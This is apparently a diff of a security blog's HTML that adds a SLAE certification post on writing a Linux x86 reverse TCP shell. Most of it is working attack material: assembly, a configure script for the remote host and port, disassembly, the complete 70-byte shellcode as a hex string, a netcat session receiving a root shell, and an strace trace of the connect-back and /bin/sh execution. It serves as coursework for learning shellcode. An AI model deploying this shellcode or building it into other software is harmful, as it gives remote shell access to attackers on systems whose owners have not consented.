+</span><span class='line'>  <span class="nf">cdq</span>                     <span class="err">;</span> <span class="no">eax</span> <span class="no">is</span> <span class="no">zero</span> <span class="no">from</span> <span class="no">the</span> <span class="no">dup2</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="no">above</span> <span class="p">(</span><span class="no">stdin</span> <span class="no">fd</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">eax</span>                <span class="err">;</span> <span class="no">to</span> <span class="no">null</span> <span class="no">terminate</span> <span class="no">the</span> <span class="no">filename</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0xb</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">execve</span><span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*,</span> <span class="no">char</span> <span class="p">*</span><span class="no">const</span> <span class="err">[]</span><span class="p">,</span> <span class="no">char</span> <span class="p">*</span><span class="no">const</span> <span class="err">[]</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x68732f6e</span>         <span class="err">;</span> <span class="no">n</span><span class="err">/</span><span class="no">sh</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x69622f2f</span>         <span class="err">;</span> <span class="err">//</span><span class="no">bi</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>            <span class="err">;</span> <span class="no">filename</span>
+</span><span class='line'>  <span class="nf">inc</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">ecx</span> <span class="p">(</span><span class="no">argv</span><span class="p">)</span> <span class="no">is</span> <span class="mi">0xffffffff</span> <span class="no">from</span> <span class="no">the</span> <span class="no">above</span> <span class="no">dup</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To define the remote host and port, like with the bind shell, the configure script should be used with the -h (127.1.1.1 by default) and -r (4242/tcp by default) command-line options:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./configure -h 127.2.2.2 -r 1337
+</span><span class='line'>Using remote host: 0x0202027f
+</span><span class='line'>Using listening port: 0x9210
+</span><span class='line'>Using remote port: 0x3905
+</span><span class='line'><span class="nv">$ </span>./configure -h 127.0.0.1 -r 1337
+</span><span class='line'>Host contains NUL bytes!
+</span><span class='line'><span class="nv">$ </span>./configure -h 127.3.3.3 -r 1280
+</span><span class='line'>Port contains NUL bytes!
+</span><span class='line'><span class="nv">$ </span>./configure
+</span><span class='line'>Using remote host: 0x0101017f
+</span><span class='line'>Using listening port: 0x9210
+</span><span class='line'>Using remote port: 0x9210
+</span><span class='line'><span class="nv">$ </span><span class="nb">cd </span>0x02-reverse/
+</span><span class='line'><span class="nv">$ </span>make
+</span><span class='line'>nasm  -f elf32 -o reverse.o reverse.asm
+</span><span class='line'>ld  -o reverse reverse.o
+</span><span class='line'><span class="m">08048060</span> &lt;_start&gt;:
+</span><span class='line'> 8048060:       <span class="m">31</span> c0                   xor    eax,eax
+</span><span class='line'> 8048062:       <span class="m">99</span>                      cdq
+</span><span class='line'> 8048063:       <span class="m">66</span> b8 <span class="m">67</span> <span class="m">01</span>             mov    ax,0x167
+</span><span class='line'> 8048067:       6a <span class="m">02</span>                   push   0x2
+</span><span class='line'> 8048069:       5b                      pop    ebx
+</span><span class='line'> 804806a:       6a <span class="m">01</span>                   push   0x1
+</span><span class='line'> 804806c:       <span class="m">59</span>                      pop    ecx
+</span><span class='line'> 804806d:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
+</span><span class='line'> 804806f:       <span class="m">93</span>                      xchg   ebx,eax
+</span><span class='line'> 8048070:       <span class="m">66</span> b8 6a <span class="m">01</span>             mov    ax,0x16a
+</span><span class='line'> 8048074:       <span class="m">68</span> 7f <span class="m">01</span> <span class="m">01</span> <span class="m">01</span>          push   0x101017f
+</span><span class='line'> 8048079:       <span class="m">66</span> <span class="m">68</span> <span class="m">10</span> <span class="m">92</span>             pushw  0x9210
+</span><span class='line'> 804807d:       <span class="m">66</span> 6a <span class="m">02</span>                pushw  0x2
+</span><span class='line'> 8048080:       <span class="m">89</span> e1                   mov    ecx,esp
+</span><span class='line'> 8048082:       6a <span class="m">10</span>                   push   0x10
+</span><span class='line'> 8048084:       5a                      pop    edx
+</span><span class='line'> 8048085:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
+</span><span class='line'> 8048087:       6a <span class="m">02</span>                   push   0x2
+</span><span class='line'> 8048089:       <span class="m">59</span>                      pop    ecx
+</span><span class='line'>
+</span><span class='line'>0804808a &lt;bind_dup2_loop&gt;:
+</span><span class='line'> 804808a:       6a 3f                   push   0x3f
+</span><span class='line'> 804808c:       <span class="m">58</span>                      pop    eax
+</span><span class='line'> 804808d:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
+</span><span class='line'> 804808f:       <span class="m">49</span>                      dec    ecx
+</span><span class='line'> 8048090:       <span class="m">79</span> f8                   jns    804808a &lt;bind_dup2_loop&gt;
+</span><span class='line'> 8048092:       <span class="m">99</span>                      cdq
+</span><span class='line'> 8048093:       <span class="m">50</span>                      push   eax
+</span><span class='line'> 8048094:       6a 0b                   push   0xb
+</span><span class='line'> 8048096:       <span class="m">58</span>                      pop    eax
+</span><span class='line'> 8048097:       <span class="m">68</span> 6e 2f <span class="m">73</span> <span class="m">68</span>          push   0x68732f6e
+</span><span class='line'> 804809c:       <span class="m">68</span> 2f 2f <span class="m">62</span> <span class="m">69</span>          push   0x69622f2f
+</span><span class='line'> 80480a1:       <span class="m">89</span> e3                   mov    ebx,esp
+</span><span class='line'> 80480a3:       <span class="m">41</span>                      inc    ecx
+</span><span class='line'> 80480a4:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
+</span><span class='line'>Shellcode size: 70
+</span><span class='line'><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>99<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>67<span class="se">\x</span>01<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>5b<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>59<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>66<span class="se">\x</span>b8<span class="se">\x</span>6a<span class="se">\x</span>01<span class="se">\x</span>68<span class="se">\x</span>7f<span class="se">\x</span>01<span class="se">\x</span>01<span class="se">\x</span>01<span class="se">\x</span>66<span class="se">\x</span>68<span class="se">\x</span>10<span class="se">\x</span>92<span class="se">\x</span>66<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>89<span class="se">\x</span>e1<span class="se">\x</span>6a<span class="se">\x</span>10<span class="se">\x</span>5a<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>6a<span class="se">\x</span>02<span class="se">\x</span>59<span class="se">\x</span>6a<span class="se">\x</span>3f<span class="se">\x</span>58<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>49<span class="se">\x</span>79<span class="se">\x</span>f8<span class="se">\x</span>99<span class="se">\x</span>50<span class="se">\x</span>6a<span class="se">\x</span>0b<span class="se">\x</span>58<span class="se">\x</span>68<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>68<span class="se">\x</span>2f<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>41<span class="se">\x</span>cd<span class="se">\x</span>80
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nc -lv 127.1.1.1 4242
+</span><span class='line'>Listening on <span class="o">[</span>127.1.1.1<span class="o">]</span> <span class="o">(</span>family 0, port 4242<span class="o">)</span>
+</span><span class='line'>Connection from localhost <span class="m">38844</span> received!
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span><span class='line'><span class="c"># ./shellcode</span>
+</span><span class='line'>Shellcode length: 70
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># make strace</span>
+</span><span class='line'>Shellcode length: 70
+</span><span class='line'><span class="c"># head -n35 reverse.strace</span>
+</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;./shellcode&quot;</span>, <span class="o">[</span><span class="s2">&quot;./shellcode&quot;</span><span class="o">]</span>, <span class="o">[</span>/* <span class="m">24</span> vars */<span class="o">])</span> <span class="o">=</span> 0
+</span><span class='line'>write<span class="o">(</span>1, <span class="s2">&quot;Shellcode length: 70\n&quot;</span>, 21<span class="o">)</span>  <span class="o">=</span> 21
+</span><span class='line'>socket<span class="o">(</span>AF_INET, SOCK_STREAM, IPPROTO_IP<span class="o">)</span> <span class="o">=</span> 3
+</span><span class='line'>connect<span class="o">(</span>3, <span class="o">{</span><span class="nv">sa_family</span><span class="o">=</span>AF_INET, <span class="nv">sin_port</span><span class="o">=</span>htons<span class="o">(</span>4242<span class="o">)</span>, <span class="nv">sin_addr</span><span class="o">=</span>inet_addr<span class="o">(</span><span class="s2">&quot;127.1.1.1&quot;</span><span class="o">)}</span>, 16<span class="o">)</span> <span class="o">=</span> 0
+</span><span class='line'>dup2<span class="o">(</span>3, 2<span class="o">)</span>                              <span class="o">=</span> 2
+</span><span class='line'>dup2<span class="o">(</span>3, 1<span class="o">)</span>                              <span class="o">=</span> 1
+</span><span class='line'>dup2<span class="o">(</span>3, 0<span class="o">)</span>                              <span class="o">=</span> 0
+</span><span class='line'>execve<span class="o">(</span><span class="s2">&quot;//bin/sh&quot;</span>, NULL, NULL<span class="o">)</span>          <span class="o">=</span> 0
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This blog post has been created for completing the requirements of the
+SecurityTube Linux Assembly Expert certification:</p>
+
+<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert</a></p>
+
+<p>Student-ID: SLAE-1154</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1064,7 +1636,7 @@
 </span></code></pre></td></tr></table></div></figure>
 
 
-<p>To confirm with <a href="http://man7.org/linux/man-pages/man1/strace.1.html">strace(1)</a>:</p>
+
 
 <figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
@@ -2688,6 +3260,10 @@ to capture the flag:</p>
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2018/05/21/slae-0x02-reverse-tcp-shell/">SLAE 0x02: Reverse TCP Shell</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2018/05/20/slae-0x01-bind-tcp-shell/">SLAE 0x01: Bind TCP Shell</a>
       </li>
     
@@ -2701,10 +3277,6 @@ to capture the flag:</p>
     
       <li class="post">
         <a href="/blog/2015/12/29/protostar-stack/">Protostar Stack</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2015/11/12/rop-primer-0-dot-2/">ROP Primer: 0.2</a>
       </li>
     
   </ul>
